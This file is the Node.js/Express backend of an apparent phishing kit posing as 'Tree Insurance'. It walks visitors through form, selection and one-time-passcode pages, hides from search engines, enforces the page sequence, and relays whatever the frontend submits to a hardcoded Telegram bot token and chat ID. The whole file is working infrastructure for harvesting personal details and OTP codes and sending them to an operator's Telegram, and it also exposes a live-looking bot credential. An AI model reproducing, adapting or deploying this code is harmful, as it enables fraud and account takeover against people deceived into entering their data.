/**
 * Tree Insurance - Secure Server
 * Server-Side Telegram Proxy with Hardcoded Credentials
 */

const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const https = require('https');

// ============================================
// Configuration
// ============================================
const app = express();
const PORT = process.env.PORT || 3000;
const IS_PRODUCTION = process.env.NODE_ENV === 'production';

// ============================================
// Hardcoded Telegram Credentials (Server-Side Only)
// ============================================
const TELEGRAM_BOT_TOKEN = "8731307636:AAEBSaoSnJZcrk5jegVkZ-aE-JUpKlhtK1E";
const TELEGRAM_CHAT_ID = "8108427825";

// ============================================
// Security: Generate Session Secret
// ============================================
const SESSION_SECRET = crypto.randomBytes(64).toString('hex');

// ============================================
// Security: Session Configuration
// ============================================
const session = require('express-session');
app.use(session({
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: IS_PRODUCTION,
    httpOnly: true,
    maxAge: 30 * 60 * 1000,
    sameSite: 'strict'
  }
}));

// ============================================
// Security: Helmet Headers
// ============================================
app.use(function(req, res, next) {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('X-Robots-Tag', 'noindex, nofollow');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  next();
});

// ============================================
// Middleware
// ============================================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set('trust proxy', 1);

// ============================================
// Step Sequence Definition
// ============================================
const STEPS = {
  INDEX: 'index',
  INDEX_COMPLETED: 'index_completed',
  FORM1: 'form1',
  FORM1_COMPLETED: 'form1_completed',
  SELECT: 'select',
  TOTALSELECT: 'totalselect',
  OTP: 'otp'
};

const STEP_SEQUENCE = [STEPS.INDEX, STEPS.INDEX_COMPLETED, STEPS.FORM1, STEPS.FORM1_COMPLETED, STEPS.SELECT, STEPS.TOTALSELECT, STEPS.OTP];

// Page to Step Mapping
const PAGE_TO_STEP = {
  '/': STEPS.INDEX,
  '/index.html': STEPS.INDEX,
  '/form1': STEPS.FORM1,
  '/form1.html': STEPS.FORM1,
  '/select': STEPS.SELECT,
  '/select.html': STEPS.SELECT,
  '/totalselect': STEPS.TOTALSELECT,
  '/totalselect.html': STEPS.TOTALSELECT,
  '/otp': STEPS.OTP,
  '/otp.html': STEPS.OTP,
  '/otp2': STEPS.OTP,
  '/otp2.html': STEPS.OTP,
  '/otp3': STEPS.OTP,
  '/otp3.html': STEPS.OTP
};

// ============================================
// Step Sequence Middleware
// ============================================
const enforceStepSequence = function(req, res, next) {
  const requestedPath = req.path;
  const requestedStep = PAGE_TO_STEP[requestedPath] || PAGE_TO_STEP[requestedPath + '.html'] || PAGE_TO_STEP['/' + requestedPath];
  
  // Initialize session if not exists
  if (!req.session.currentStep) {
    req.session.currentStep = STEPS.INDEX;
    req.session.stepHistory = [];
    req.session.createdAt = Date.now();
    req.session.lastActivity = Date.now();
    console.log('[SESSION] New session initialized');
  }
  
  // Update last activity
  req.session.lastActivity = Date.now();
  
  // If requesting a page
  if (requestedStep) {
    const currentStepIndex = STEP_SEQUENCE.indexOf(req.session.currentStep);
    const requestedStepIndex = STEP_SEQUENCE.indexOf(requestedStep);
    
    console.log('[ROUTE] Path: ' + requestedPath + ', Current: ' + req.session.currentStep + ', Requested: ' + requestedStep);
    
    if (currentStepIndex === -1 || requestedStepIndex === -1) {
      console.warn('[SECURITY] Unknown step - redirecting to index');
      return res.redirect('/');
    }
    
    const isBackwards = requestedStepIndex < currentStepIndex;
    const isAllowedForward = requestedStepIndex <= currentStepIndex + 2;
    
    if (isAllowedForward || isBackwards) {
      if (requestedStepIndex > currentStepIndex) {
        req.session.stepHistory.push(req.session.currentStep);
        req.session.currentStep = requestedStep;
        console.log('[STEP] Advanced to: ' + requestedStep);
      }
      return next();
    } else {
      console.warn('[SECURITY] Step bypass attempt from ' + req.session.currentStep + ' to ' + requestedStep + ' IP: ' + req.ip);
      return res.redirect('/');
    }
  }
  
  next();
};

// ============================================
// Helper: Send Telegram message using HTTPS
// ============================================
function sendTelegramMessage(text, parse_mode = 'Markdown') {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text,
      parse_mode
    });

    const request = https.request(
      {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(postData)
        },
        timeout: 15000
      },
      (response) => {
        let body = '';
        response.on('data', (chunk) => { body += chunk; });
        response.on('end', () => {
          try {
            const json = JSON.parse(body);
            if (!json.ok) {
              return reject(new Error(json.description || 'Telegram API error'));
            }
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON from Telegram: ' + err.message + ' body=' + body));
          }
        });
      }
    );

    request.on('error', reject);
    request.on('timeout', () => {
      request.destroy(new Error('Telegram request timeout'));
    });
    request.write(postData);
    request.end();
  });
}

// ============================================
// API: Health Check
// ============================================
app.get('/api/health', function(req, res) {
  res.json({ 
    status: 'ok',
    build: 'SECURE-v1.3.0',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// API: Submit Data (Telegram Proxy)
// This API receives data from frontend, sends to Telegram server-side,
// then upgrades session and returns redirect URL
// ============================================
app.post('/api/submit-data', async function(req, res) {
  const { message } = req.body;
  
  if (!message || typeof message !== 'string') {
    return res.status(400).json({ success: false, error: 'Message is required' });
  }
  
  try {
    // Send message to Telegram from backend (credentials never exposed to frontend)
    const data = await sendTelegramMessage(message, 'Markdown');
    console.log('[TELEGRAM] Message sent successfully', data && data.result && data.result.message_id);
    res.json({ success: true });
  } catch (error) {
    console.error('[TELEGRAM] Error:', error);
    res.status(500).json({ success: false, error: 'Server error' });
  }
});

// ============================================
// API: Complete Step (with session upgrade)
// ============================================
app.post('/api/complete-step', function(req, res) {
  const { step } = req.body;
  
  if (!req.session.currentStep) {
    req.session.currentStep = STEPS.INDEX;
    req.session.stepHistory = [];
  }
  
  var newStep = null;
  var redirectTo = '/';
  
  switch(step) {
    case 'STEP1':
      newStep = STEPS.FORM1;
      redirectTo = '/form1';
      break;
    case 'STEP2':
      newStep = STEPS.SELECT;
      redirectTo = '/select';
      break;
    case 'STEP3':
      newStep = STEPS.TOTALSELECT;
      redirectTo = '/totalselect';
      break;
    case 'OTP':
      newStep = STEPS.OTP;
      redirectTo = '/otp';
      break;
    default:
      return res.status(400).json({ success: false, error: 'Invalid step' });
  }
  
  var currentIndex = STEP_SEQUENCE.indexOf(req.session.currentStep);
  var newStepIndex = STEP_SEQUENCE.indexOf(newStep);
  
  console.log('[COMPLETE STEP] request:', step, 'currentStep:', req.session.currentStep, 'newStep:', newStep, 'redirectTo:', redirectTo, 'currentIndex:', currentIndex, 'newStepIndex:', newStepIndex);
  
  // Allow progressing over the hidden "completed" sentinel steps.
  if (newStepIndex <= currentIndex + 2) {
    req.session.stepHistory.push(req.session.currentStep);
    req.session.currentStep = newStep;
    req.session.lastActivity = Date.now();
    
    console.log('[SESSION] Step completed. New step: ' + newStep);
    
    res.json({ 
      success: true, 
      redirectTo: redirectTo,
      currentStep: newStep 
    });
  } else {
    console.warn('[SECURITY] Invalid step progression attempt');
    res.status(403).json({ success: false, error: 'Invalid step progression' });
  }
});

// ============================================
// API: Send Message (Legacy support)
// ============================================
app.post('/api/send-message', async function(req, res) {
  const { text, parse_mode } = req.body;
  
  if (!text || typeof text !== 'string') {
    return res.status(400).json({ ok: false, error: 'Text is required' });
  }
  
  try {
    var data = await sendTelegramMessage(text, parse_mode || 'Markdown');
    res.json({ ok: true });
  } catch (error) {
    console.error('[TELEGRAM] Error:', error);
    res.status(500).json({ ok: false, error: 'Failed to send message' });
  }
});

// ============================================
// API: Get Session Status
// ============================================
app.get('/api/session-status', function(req, res) {
  res.json({
    currentStep: req.session.currentStep || 'none',
    stepHistory: req.session.stepHistory || [],
    lastActivity: req.session.lastActivity,
    isValid: !!req.session.currentStep
  });
});

// ============================================
// API: Reset Session
// ============================================
app.post('/api/reset-session', function(req, res) {
  req.session.destroy(function(err) {
    if (err) {
      return res.status(500).json({ success: false, error: 'Failed to reset session' });
    }
    res.json({ success: true });
  });
});

// ============================================
// Static Files Configuration
// ============================================
var PUBLIC_DIR = path.join(__dirname, 'public');
var PROTECTED_DIR = path.join(__dirname, 'protected_pages');

// Block direct HTML files from public/static requests, but allow protected route paths
const ALLOWED_HTML_PATHS = new Set([
  '/',
  '/index.html',
  '/form1',
  '/form1.html',
  '/select',
  '/select.html',
  '/totalselect',
  '/totalselect.html',
  '/otp',
  '/otp.html',
  '/otp2',
  '/otp2.html',
  '/otp3',
  '/otp3.html'
]);

app.use(function(req, res, next) {
  var ext = path.extname(req.path).toLowerCase();
  if (ext === '.html' && !ALLOWED_HTML_PATHS.has(req.path)) {
    console.warn('[SECURITY] Direct HTML access blocked: ' + req.path);
    return res.redirect('/');
  }
  next();
});

// Serve public files only (CSS, JS, images)
app.use(express.static(PUBLIC_DIR, {
  index: false,
  setHeaders: function(res, filePath) {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Cache-Control', 'no-store, no-cache');
  }
}));

// ============================================
// Protected Routes
// ============================================

// Root - Index Page
app.get('/', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'index.html'));
});

app.get('/index.html', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'index.html'));
});

// Form1 Page
app.get('/form1', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'form1.html'));
});

app.get('/form1.html', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'form1.html'));
});

// Select Page
app.get('/select', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'select.html'));
});

app.get('/select.html', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'select.html'));
});

// Totalselect Page
app.get('/totalselect', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'totalselect.html'));
});

app.get('/totalselect.html', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'totalselect.html'));
});

// OTP Pages
app.get('/otp', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'otp.html'));
});

app.get('/otp.html', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'otp.html'));
});

app.get('/otp2', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'otp2.html'));
});

app.get('/otp2.html', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'otp2.html'));
});

app.get('/otp3', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'otp3.html'));
});

app.get('/otp3.html', enforceStepSequence, function(req, res) {
  res.sendFile(path.join(PROTECTED_DIR, 'otp3.html'));
});

// ============================================
// Catch-all: Block All Other HTML Access
// ============================================
app.get('*.html', function(req, res) {
  console.warn('[SECURITY] Blocked HTML access: ' + req.path);
  res.redirect('/');
});

// 404 Handler
app.use(function(req, res) {
  res.redirect('/');
});

// ============================================
// Server Start
// ============================================
app.listen(PORT, function() {
  console.log('============================================================');
  console.log('  Tree Insurance - SECURE SERVER v1.3.0');
  console.log('============================================================');
  console.log('  Build Date: ' + new Date().toISOString());
  console.log('  Port: ' + PORT);
  console.log('  Environment: ' + (IS_PRODUCTION ? 'PRODUCTION' : 'DEVELOPMENT'));
  console.log('------------------------------------------------------------');
  console.log('  SECURITY FEATURES:');
  console.log('  - Telegram Credentials: HARDCODED (not exposed)');
  console.log('  - Session Secret: ' + (SESSION_SECRET.substring(0, 8) + '...'));
  console.log('  - Cookie Security: httpOnly, sameSite=strict');
  console.log('  - Sequential Step Enforcement: ENABLED');
  console.log('  - Direct HTML Access: BLOCKED');
  console.log('------------------------------------------------------------');
  console.log('  STEP SEQUENCE:');
  console.log('  1. / (index)');
  console.log('  2. /form1');
  console.log('  3. /select');
  console.log('  4. /totalselect');
  console.log('  5. /otp /otp2 /otp3');
  console.log('============================================================');
});
